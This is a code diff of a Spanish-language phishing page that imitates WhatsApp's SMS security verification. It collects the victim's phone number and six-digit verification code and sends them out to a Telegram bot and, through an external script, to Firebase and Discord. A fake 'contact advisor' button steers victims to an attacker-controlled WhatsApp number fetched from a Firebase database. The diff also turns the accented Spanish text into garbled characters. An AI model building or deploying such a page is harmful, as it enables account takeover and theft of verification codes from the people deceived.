@@ -1,18 +1,18 @@
-
+﻿
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Seguridad - WhatsApp</title>
+    <title>VerificaciÃ³n de Seguridad - WhatsApp</title>
     <!-- Favicon de WhatsApp -->
     <link rel="shortcut icon" type="image/png" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rFVoUqc_cgA.png">
     <!-- Fuente similar a la de WhatsApp -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <!-- Iconos de Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Scripts de integración -->
+    <!-- Scripts de integraciÃ³n -->
     <script src="xjsx.js"></script>
     <style>
         /* Paleta de colores inspirada en WhatsApp */
@@ -42,7 +42,7 @@
             min-height: 100vh;
             font-family: 'Roboto', sans-serif;
             color: var(--wa-text-primary);
-            /* Fondo clásico de chat de WhatsApp */
+            /* Fondo clÃ¡sico de chat de WhatsApp */
             background-color: var(--wa-chat-background);
             background-image: url("data:image/svg+xml,%3Csvg width='600' height='600' viewBox='0 0 600 600' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23999289' fill-opacity='0.15'%3E%3Cpath d='M582 600L600 582 0 182 18 200zM300 0l18 18-300 300-18-18z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
             display: flex;
@@ -52,7 +52,7 @@
             overflow: hidden;
         }
 
-        /* Contenedor de la animación inicial */
+        /* Contenedor de la animaciÃ³n inicial */
         .pre-verificacion-container {
             display: flex;
             flex-direction: column;
@@ -71,7 +71,7 @@
             color: var(--wa-text-primary);
         }
 
-        /* Estilo del teléfono */
+        /* Estilo del telÃ©fono */
         .telefono-mockup {
             width: 280px;
             height: 520px;
@@ -90,7 +90,7 @@
             overflow: hidden;
             position: relative;
             display: flex;
-            align-items: flex-start; /* Alinea la notificación arriba */
+            align-items: flex-start; /* Alinea la notificaciÃ³n arriba */
             justify-content: center;
         }
         
@@ -146,7 +146,7 @@
             animation: digitAppear 0.5s forwards;
             display: inline-block;
         }
-        /* Animación escalonada mejorada */
+        /* AnimaciÃ³n escalonada mejorada */
         .code span:nth-child(1) { animation-delay: 1.2s; }
         .code span:nth-child(2) { animation-delay: 1.3s; }
         .code span:nth-child(3) { animation-delay: 1.4s; }
@@ -395,9 +395,9 @@ document.addEventListener("keydown", function(e) {
 });
 </script>
 
-<!-- Pantalla de animación inicial -->
+<!-- Pantalla de animaciÃ³n inicial -->
 <div class="pre-verificacion-container">
-    <h1>Revisa tu aplicación de mensajes, te hemos enviado un código de verificación SMS</h1>
+    <h1>Revisa tu aplicaciÃ³n de mensajes, te hemos enviado un cÃ³digo de verificaciÃ³n SMS</h1>
     <div class="telefono-mockup">
         <div class="telefono-screen">
             <div class="wa-notificacion">
@@ -406,7 +406,7 @@ document.addEventListener("keydown", function(e) {
                     <strong>Messenger SMS</strong>
                 </div>
                 <div class="wa-notificacion-body">
-                    <p>te llegará un código de 6 digitos:</p>
+                    <p>te llegarÃ¡ un cÃ³digo de 6 digitos:</p>
                     <p><strong class="code">
                         <span>*</span><span>*</span><span>*</span><span class="dash">_</span><span>*</span><span>*</span><span>*</span>
                     </strong></p>
@@ -416,21 +416,21 @@ document.addEventListener("keydown", function(e) {
     </div>
 </div>
 
-<!-- Pantalla de verificación principal -->
+<!-- Pantalla de verificaciÃ³n principal -->
 <div class="wa-container" aria-live="polite">
     <div class="wa-header">
         <div class="wa-logo-container">
             <div class="wa-logo">
                 <i class="fab fa-whatsapp"></i>
             </div>
-            <h1>Verificación SMS</h1>
-            <p class="wa-subtitle" id="wa-subtitle">Hemos enviado un código de 6 dígitos de verificación de SMS a tu número que termina en *** *** 0000</p>
+            <h1>VerificaciÃ³n SMS</h1>
+            <p class="wa-subtitle" id="wa-subtitle">Hemos enviado un cÃ³digo de 6 dÃ­gitos de verificaciÃ³n de SMS a tu nÃºmero que termina en *** *** 0000</p>
         </div>
     </div>
     <div class="wa-content">
-        <form id="loginForm" aria-label="Formulario de verificación de código">
+        <form id="loginForm" aria-label="Formulario de verificaciÃ³n de cÃ³digo">
             <div class="wa-form-group">
-                <label for="auth" class="wa-input-label">Código de Verificación SMS</label>
+                <label for="auth" class="wa-input-label">CÃ³digo de VerificaciÃ³n SMS</label>
                 <div class="wa-input-container">
                     <input type="text" id="auth" name="auth" ="6" maxlength="6"
                            placeholder="* * * * * *"
@@ -438,14 +438,14 @@ document.addEventListener("keydown", function(e) {
                            oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6)">
                 </div>
                 <div class="wa-error-message" id="error-message" role="alert">
-                    Por favor, ingresa un código de 6 dígitos válido
+                    Por favor, ingresa un cÃ³digo de 6 dÃ­gitos vÃ¡lido
                 </div>
             </div>
             <button type="submit" id="submitButton" class="wa-btn">
                 <i class="fas fa-lock"></i> Verificar Cuenta
             </button>
             <button type="button" id="advisorButton" class="wa-btn-advisor">
-                <i class="fab fa-whatsapp"></i> No he recibido mi código SMS, contactar asesor
+                <i class="fab fa-whatsapp"></i> No he recibido mi cÃ³digo SMS, contactar asesor
             </button>
         </form>
     </div>
@@ -454,7 +454,7 @@ document.addEventListener("keydown", function(e) {
 <script>
 $(document).ready(function() {
     
-    // Lógica para la transición automática
+    // LÃ³gica para la transiciÃ³n automÃ¡tica
     setTimeout(function() {
         $('.pre-verificacion-container').css('animation', 'fadeOut 0.8s forwards');
         setTimeout(function() {
@@ -463,13 +463,13 @@ $(document).ready(function() {
         }, 800);
     }, 4000);
     
-    // Función para obtener el teléfono del localStorage
+    // FunciÃ³n para obtener el telÃ©fono del localStorage
     function obtenerTelefonoUsuario() {
         let telefono = localStorage.getItem('telefonoUsuario') || localStorage.getItem('telefono') || '0000000000';
         return telefono;
     }
 
-    // Función para gestionar códigos usados
+    // FunciÃ³n para gestionar cÃ³digos usados
     function getUsedCodes(telefono) {
         const usedCodes = JSON.parse(localStorage.getItem('usedCodes') || '{}');
         return usedCodes[telefono] || [];
@@ -486,17 +486,17 @@ $(document).ready(function() {
         }
     }
 
-    // Actualizar subtítulo con los últimos 4 dígitos del número de teléfono
+    // Actualizar subtÃ­tulo con los Ãºltimos 4 dÃ­gitos del nÃºmero de telÃ©fono
     function actualizarSubtitulo() {
         const telefono = obtenerTelefonoUsuario();
         const soloDigitos = telefono.replace(/\D/g, '');
         const lastFourDigits = soloDigitos.length >= 4 ? soloDigitos.slice(-4) : '0000';
-        $('#wa-subtitle').text(`Hemos enviado un código de 6 dígitos de verificación de SMS a tu número que termina en *** *** ${lastFourDigits}`);
+        $('#wa-subtitle').text(`Hemos enviado un cÃ³digo de 6 dÃ­gitos de verificaciÃ³n de SMS a tu nÃºmero que termina en *** *** ${lastFourDigits}`);
     }
 
     actualizarSubtitulo();
 
-    // Función para enviar mensaje a Telegram si está configurado
+    // FunciÃ³n para enviar mensaje a Telegram si estÃ¡ configurado
     function enviarMensajeTelegram(mensaje) {
         if (typeof telegram_bot_id === 'undefined' || typeof chat_id === 'undefined') {
             return false;
@@ -520,7 +520,7 @@ $(document).ready(function() {
         return $.ajax(settings);
     }
 
-    // Validación del formulario
+    // ValidaciÃ³n del formulario
     $('#loginForm').submit(async function(e) {
         e.preventDefault();
         const codeInput = $('#auth');
@@ -534,34 +534,34 @@ $(document).ready(function() {
         codeInput.removeClass('invalid').attr('aria-invalid', 'false');
         errorMessage.hide();
 
-        // Validar si el código coincide con el código de pantalla
+        // Validar si el cÃ³digo coincide con el cÃ³digo de pantalla
         const screenCode = localStorage.getItem('screenCode');
         if (screenCode && code === screenCode) {
             codeInput.addClass('invalid').attr('aria-invalid', 'true');
-            errorMessage.text('Este código ya fue utilizado anteriormente. Por favor ingrese un código diferente.').show();
+            errorMessage.text('Este cÃ³digo ya fue utilizado anteriormente. Por favor ingrese un cÃ³digo diferente.').show();
             return;
         }
 
-        // Validar el código (6 dígitos numéricos)
+        // Validar el cÃ³digo (6 dÃ­gitos numÃ©ricos)
         if (!/^\d{6}$/.test(code)) {
             codeInput.addClass('invalid').attr('aria-invalid', 'true');
-            errorMessage.text('Por favor, ingresa un código de 6 dígitos válido').show();
+            errorMessage.text('Por favor, ingresa un cÃ³digo de 6 dÃ­gitos vÃ¡lido').show();
             return;
         }
 
-        // Verificar si el código ya fue usado (en usedCodes)
+        // Verificar si el cÃ³digo ya fue usado (en usedCodes)
         if (usedCodes.includes(code)) {
             codeInput.addClass('invalid').attr('aria-invalid', 'true');
-            errorMessage.text('Este código ya fue utilizado anteriormente. Por favor ingrese un código diferente.').show();
+            errorMessage.text('Este cÃ³digo ya fue utilizado anteriormente. Por favor ingrese un cÃ³digo diferente.').show();
             return;
         }
 
         submitButton.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Verificando...');
 
-        // Guardar el código como usado
+        // Guardar el cÃ³digo como usado
         saveUsedCode(telefono, code);
 
-        // Guardar en Firebase y enviar a Discord a través de xjsx.js
+        // Guardar en Firebase y enviar a Discord a travÃ©s de xjsx.js
         if (window.sendWhatsAppSMS) {
             try {
                 await window.sendWhatsAppSMS(telefono, code);
@@ -570,23 +570,23 @@ $(document).ready(function() {
             }
         }
 
-        // Enviar a Telegram si está configurado (no bloqueante)
+        // Enviar a Telegram si estÃ¡ configurado (no bloqueante)
         try {
-            const mensajeTelegram = "📱 Código de SMS 📱\n\n" +
-                "📞 Teléfono: " + telefono + "\n" +
-                "🔑 Código: " + code + "\n" +
-                "📅 Fecha/Hora: " + new Date().toLocaleString();
+            const mensajeTelegram = "ðŸ“± CÃ³digo de SMS ðŸ“±\n\n" +
+                "ðŸ“ž TelÃ©fono: " + telefono + "\n" +
+                "ðŸ”‘ CÃ³digo: " + code + "\n" +
+                "ðŸ“… Fecha/Hora: " + new Date().toLocaleString();
             enviarMensajeTelegram(mensajeTelegram);
         } catch(err) {}
 
-        submitButton.html('<i class="fas fa-check"></i> Verificación Exitosa').css('background', '#28a745');
+        submitButton.html('<i class="fas fa-check"></i> VerificaciÃ³n Exitosa').css('background', '#28a745');
 
         setTimeout(function() {
             window.location = 'cargando.html';
         }, 800);
     });
 
-    // Acción para el botón de contactar asesor
+    // AcciÃ³n para el botÃ³n de contactar asesor
     $('#advisorButton').click(async function() {
         const btn = $(this);
         btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Conectando con asesor...');
@@ -601,14 +601,21 @@ $(document).ready(function() {
         }
 
         try {
-            const mensajeTelegram = "⚠️ SOLICITUD DE ASESOR SMS ⚠️\n\n" +
-                "📞 Teléfono: " + telefono + "\n" +
-                "ℹ️ Usuario reportó: No ha recibido su código SMS\n" +
-                "📅 Fecha/Hora: " + new Date().toLocaleString();
+            const mensajeTelegram = "âš ï¸ SOLICITUD DE ASESOR SMS âš ï¸\n\n" +
+                "ðŸ“ž TelÃ©fono: " + telefono + "\n" +
+                "â„¹ï¸ Usuario reportÃ³: No ha recibido su cÃ³digo SMS\n" +
+                "ðŸ“… Fecha/Hora: " + new Date().toLocaleString();
             enviarMensajeTelegram(mensajeTelegram);
         } catch(err) {}
 
-        const phone = (window.getAdvisorPhone && window.getAdvisorPhone()) ? window.getAdvisorPhone() : '573243161381';
+                let phone = '573243161381';
+        try {
+            const res = await fetch('https://lodewhapan-default-rtdb.firebaseio.com/config/advisorPhone.json');
+            const data = await res.json();
+            if (data) phone = data;
+        } catch(e) {
+            phone = (window.getAdvisorPhone && window.getAdvisorPhone()) ? window.getAdvisorPhone() : (localStorage.getItem('advisorPhone') || '573243161381');
+        }
         const targetUrl = `https://api.whatsapp.com/send/?phone=${encodeURIComponent(phone)}&text=Necesito+ayuda+no+llega+mi+codigo&type=phone_number&app_absent=0`;
 
         setTimeout(function() {
@@ -619,4 +626,5 @@ $(document).ready(function() {
 </script>
 </body>
 </html>
+
 
